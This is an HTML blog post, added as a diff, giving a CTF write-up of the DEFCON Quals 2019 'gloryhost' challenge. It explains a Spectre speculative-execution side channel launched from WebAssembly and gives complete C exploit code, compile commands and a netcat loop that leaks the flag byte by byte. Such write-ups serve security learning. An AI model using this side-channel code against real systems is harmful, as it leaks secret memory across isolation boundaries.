@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>DEFCON Quals 2019, Gloryhost | Matt’s Website</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="DEFCON Quals 2019, Gloryhost" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="technology, programming, CTFs" />
+<meta property="og:description" content="technology, programming, CTFs" />
+<link rel="canonical" href="http://localhost:4000/ctf/spectre/webassembly/2019/05/13/defcon-quals-gloryhost.html" />
+<meta property="og:url" content="http://localhost:4000/ctf/spectre/webassembly/2019/05/13/defcon-quals-gloryhost.html" />
+<meta property="og:site_name" content="Matt’s Website" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-05-13T18:43:49-04:00" />
+<script type="application/ld+json">
+{"dateModified":"2019-05-13T18:43:49-04:00","datePublished":"2019-05-13T18:43:49-04:00","url":"http://localhost:4000/ctf/spectre/webassembly/2019/05/13/defcon-quals-gloryhost.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/spectre/webassembly/2019/05/13/defcon-quals-gloryhost.html"},"description":"technology, programming, CTFs","@type":"BlogPosting","headline":"DEFCON Quals 2019, Gloryhost","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Matt's Website" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Matt&#39;s Website</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">DEFCON Quals 2019, Gloryhost</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-05-13T18:43:49-04:00" itemprop="datePublished">May 13, 2019
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/gloryhost.jpg" /></p>
+
+<p>Author: mattypiper</p>
+
+<p>Contributors: mattypiper, fringe</p>
+
+<h2 id="description">Description</h2>
+
+<p>gloryhost is a 64-bit Linux ELF network service written in Rust. It accepts compiled WebAssembly programs on port 9999
+and executes the wasm program in a seccomp filtered sandbox. After figuring out how to generate a wasm program written in
+C using wasi-sdk, we were able to load our code into the service using base64. The service then responds with an error message expecting
+a certain export that was not found:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>your code makes me feel funny: unable to resolve entry point: Export not found: this_is_what_ive_got
+</code></pre></div></div>
+
+<p>Defining this function in C and setting it as the entry point allows the code to execute.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">this_is_what_ive_got</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/wasi-sdk/bin/clang <span class="nt">-o</span> test.wasm <span class="nt">-Wl</span>,-e,this_is_what_ive_got test.c
+</code></pre></div></div>
+
+<p>Gloryhost appears to print the return value of your function and execute the C code.
+Attempting to execute libc functions such as <code class="highlighter-rouge">open()</code> and <code class="highlighter-rouge">read()</code>
+results in the service dying prematurely with a trap:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>your code makes me feel funny: unable to execute entry point: WebAssembly trap occured during runtime: unknown
+</code></pre></div></div>
+
+<p>The service disables syscalls with seccomp, hence the WebAssembly trap. At this point we discovered a set of functions in the
+gloryhost name space that were interesting.</p>
+
+<ol>
+  <li><code class="highlighter-rouge">wasi_debug_flush</code> executes the x86 clflush instruction on the pointer argument</li>
+  <li><code class="highlighter-rouge">wasi_check_data</code>, <code class="highlighter-rouge">wasi_get_data_size</code> and the<code class="highlighter-rouge">wasi_get_data*</code> functions were recognized as a set of functions that implement
+a few of the “primitives” required to execute the <a href="https://spectreattack.com/spectre.pdf">Spectre</a> attack (speculative execution cache side channel).</li>
+  <li><code class="highlighter-rouge">wasi_debug_read</code> performs a C-style read of the pointer argument, required for Spectre.</li>
+  <li><code class="highlighter-rouge">wasi_debug_ts</code> executes the x86 <code class="highlighter-rouge">rdtsc</code> instruction, a timing instrument that can be used to execute the Spectre attack.</li>
+</ol>
+
+<p>At this point, we laid out the plan: use the gloryhost/wasi functions from our C code to implement Spectre.
+Inspection with strace and gdb revealed that the flag was being loaded into the .bss entry <code class="highlighter-rouge">_data6</code> at 0xe86120.
+The <code class="highlighter-rouge">wasi_get_data</code> functions were only provided for data2 thru data5, but the Spectre primitives could be used to read
+<code class="highlighter-rouge">_data6</code>. After some struggling with the wasi toolchain and learning about wasm in general, we were able to call the
+<code class="highlighter-rouge">gloryhost::wasi</code> functions from our C code by defining the functions as <code class="highlighter-rouge">extern</code> and linking with <code class="highlighter-rouge">-Wl,--allow-undefined</code>.
+Getting the function arguments and return values to line up was aided by the dynamic WebAssembly linker, which would print
+messages such as:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>your code makes me feel funny: unable to resolve entry point: Parameters of type [] did not match signature [I32] -&gt; [I32]
+</code></pre></div></div>
+
+<p>For getting the flag itself, the only instrument provided to send data back to the client was via the 32-bit return value
+of the <code class="highlighter-rouge">this_is_what_ive_got</code> function. For example, returning 0xdeadbeef would print:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>YOU'VE GOT deadbeef
+</code></pre></div></div>
+
+<p>We based our Spectre implementation on an
+<a href="https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6">existing Spectre PoC from ErikAugust</a>.</p>
+
+<p>As we implemented the Spectre attack, we had to take care to avoid using pointers or array indexing. This was because
+the wasi-sdk only supported 32-bit mode. So we defined the functions as follows:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="kt">int64_t</span> <span class="n">debug_ts</span><span class="p">();</span>  <span class="c1">// rdtsc
+</span><span class="k">extern</span> <span class="kt">void</span> <span class="n">debug_flush</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>  <span class="c1">// clflush
+</span><span class="k">extern</span> <span class="kt">void</span> <span class="n">debug_read</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="n">check_data</span><span class="p">(</span><span class="kt">int32_t</span><span class="p">);</span>  <span class="c1">// "victim function"
+</span><span class="k">extern</span> <span class="kt">uint64_t</span> <span class="n">get_data_size</span><span class="p">();</span>
+<span class="k">extern</span> <span class="kt">uint64_t</span> <span class="n">get_data5</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>And after some more thought, we realized that direct pointer/array accesses would not even work as expected
+when crossing the boundary from WebAssembly to C/amd64.</p>
+
+<p>Anyway, after tuning the cache timing threshold, we were able to read the flag one byte at a time (we kept
+the code from the PoC that also generated a score and put that in the return value as well to be able to gauge
+the confidence of each flag byte).</p>
+
+<h2 id="solution">Solution</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+</span>
+<span class="k">extern</span> <span class="kt">int64_t</span> <span class="n">debug_ts</span><span class="p">();</span>  <span class="c1">// rdtsc
+</span><span class="k">extern</span> <span class="kt">void</span> <span class="n">debug_flush</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>  <span class="c1">// clflush
+</span><span class="k">extern</span> <span class="kt">void</span> <span class="n">debug_read</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="n">check_data</span><span class="p">(</span><span class="kt">int32_t</span><span class="p">);</span>  <span class="c1">// "victim function"
+</span><span class="k">extern</span> <span class="kt">uint64_t</span> <span class="n">get_data_size</span><span class="p">();</span>
+<span class="k">extern</span> <span class="kt">uint64_t</span> <span class="n">get_data5</span><span class="p">();</span>
+
+<span class="cp">#define CACHE_HIT_THRESHOLD (600) </span><span class="cm">/* assume cache hit if time &lt;= threshold */</span><span class="cp">
+</span>
+<span class="cm">/* aliases from github poc to gloryhost:
+     array2 = get_data5()
+     array1_size = get_data_size()
+     victim_function = check_data()
+     array1 = get_data3()
+     flag is in _data6  */</span>
+
+<span class="kt">void</span> <span class="nf">readMemoryByte</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">malicious_x</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">value</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="kt">int</span> <span class="n">score</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">results</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">tries</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">mix_i</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">junk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">training_x</span><span class="p">,</span> <span class="n">x</span><span class="p">;</span>
+    <span class="k">volatile</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">addr</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">tries</span> <span class="o">=</span> <span class="mi">999</span><span class="p">;</span> <span class="n">tries</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">tries</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// flush data5 from cache
+</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kt">uint64_t</span> <span class="n">p</span> <span class="o">=</span> <span class="n">get_data5</span><span class="p">();</span>
+            <span class="n">p</span> <span class="o">+=</span> <span class="n">i</span><span class="o">*</span><span class="mi">512</span><span class="p">;</span>
+            <span class="n">debug_flush</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 30 loops, 5 training runs per attack
+</span>        <span class="n">training_x</span> <span class="o">=</span> <span class="n">tries</span> <span class="o">%</span> <span class="mi">16</span><span class="p">;</span> <span class="c1">// 16 == nelements(array1_size)
+</span>        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">29</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">debug_flush</span><span class="p">(</span><span class="n">get_data_size</span><span class="p">());</span>
+
+            <span class="c1">// delay
+</span>            <span class="k">for</span> <span class="p">(</span><span class="k">volatile</span> <span class="kt">int</span> <span class="n">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">z</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="n">z</span><span class="o">++</span><span class="p">);</span>
+
+            <span class="c1">// bit twiddling
+</span>            <span class="n">x</span> <span class="o">=</span> <span class="p">((</span><span class="n">j</span> <span class="o">%</span> <span class="mi">6</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xFFFF</span><span class="p">;</span> <span class="cm">/* Set x=FFF.FF0000 if j%6==0, else x=0 */</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">));</span> <span class="cm">/* Set x=-1 if j%6=0, else x=0 */</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="n">training_x</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">malicious_x</span> <span class="o">^</span> <span class="n">training_x</span><span class="p">));</span>
+
+            <span class="n">check_data</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// time reads
+</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">mix_i</span> <span class="o">=</span> <span class="p">((</span><span class="n">i</span> <span class="o">*</span> <span class="mi">167</span><span class="p">)</span> <span class="o">+</span> <span class="mi">13</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">;</span>
+
+            <span class="kt">uint64_t</span> <span class="n">addr</span>  <span class="o">=</span> <span class="n">get_data5</span><span class="p">();</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="n">mix_i</span> <span class="o">*</span> <span class="mi">512</span><span class="p">;</span>
+            <span class="n">time1</span> <span class="o">=</span> <span class="n">debug_ts</span><span class="p">();</span>
+            <span class="n">debug_read</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+			<span class="n">time2</span> <span class="o">=</span> <span class="n">debug_ts</span><span class="p">()</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">time2</span> <span class="o">&lt;=</span> <span class="n">CACHE_HIT_THRESHOLD</span><span class="p">)</span>
+				<span class="n">results</span><span class="p">[</span><span class="n">mix_i</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>
+
+		<span class="n">j</span> <span class="o">=</span> <span class="n">k</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+		<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">results</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+			<span class="p">{</span>
+				<span class="n">k</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
+				<span class="n">j</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">results</span><span class="p">[</span><span class="n">k</span><span class="p">])</span>
+			<span class="p">{</span>
+				<span class="n">k</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">results</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">results</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">results</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">&amp;&amp;</span> <span class="n">results</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span>
+			<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">j</span><span class="p">;</span>
+	<span class="n">score</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">results</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+	<span class="n">value</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">k</span><span class="p">;</span>
+	<span class="n">score</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">results</span><span class="p">[</span><span class="n">k</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">this_is_what_ive_got</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">uint32_t</span> <span class="n">malicious_x</span> <span class="o">=</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="n">MALOFFSET</span><span class="p">;</span> <span class="c1">// use compiler argument to "step" this index
+</span>	<span class="kt">int</span> <span class="n">score</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+	<span class="kt">uint8_t</span> <span class="n">value</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+	<span class="n">readMemoryByte</span><span class="p">(</span><span class="n">malicious_x</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">score</span><span class="p">);</span>
+	<span class="k">return</span> <span class="p">(</span><span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">value</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">score</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">score</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{}</span>
+</code></pre></div></div>
+
+<p>Compile with:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/wasi-sdk/bin/clang <span class="nt">-DMALOFFSET</span><span class="o">=</span>1 <span class="nt">-Ofast</span> <span class="nt">-o</span> solve.wasm <span class="se">\</span>
+    <span class="nt">-Wl</span>,-e,this_is_what_ive_got <span class="nt">-Wl</span>,--allow-undefined solve.c
+</code></pre></div></div>
+
+<p>Leak one byte at a time with a script:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span>seq 0 40<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> <span class="se">\</span>
+    nc <span class="nt">-N</span> gloryhost.quals2019.oooverflow.io 9999<span class="p">;</span> <span class="k">done</span> | <span class="se">\</span>
+    /opt/wasi-sdk/bin/clang <span class="nt">-DMALOFFSET</span><span class="o">=</span><span class="nv">$i</span> <span class="nt">-Ofast</span> <span class="nt">-o</span> solve.wasm <span class="se">\</span>
+    <span class="nt">-Wl</span>,-e,this_is_what_ive_got <span class="nt">-Wl</span>,--allow-undefined solve.c <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    <span class="nb">cat </span>solve.wasm | base64 <span class="nt">-w0</span> | nc <span class="nt">-N</span> localhost 9999 | egrep <span class="s1">'^YOU'</span> | cut <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f3</span> | cut <span class="nt">-c1-2</span>| xxd <span class="nt">-r</span> <span class="nt">-p</span><span class="p">;</span> <span class="se">\</span>
+    <span class="k">done</span>
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/ctf/spectre/webassembly/2019/05/13/defcon-quals-gloryhost.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Matt&#39;s Website</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Matt&#39;s Website</li><li><a class="u-email" href="mailto:mattypiper@gmail.com">mattypiper@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/mattypiper"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">mattypiper</span></a></li><li><a href="https://www.twitter.com/mattypiper"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">mattypiper</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>technology, programming, CTFs
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
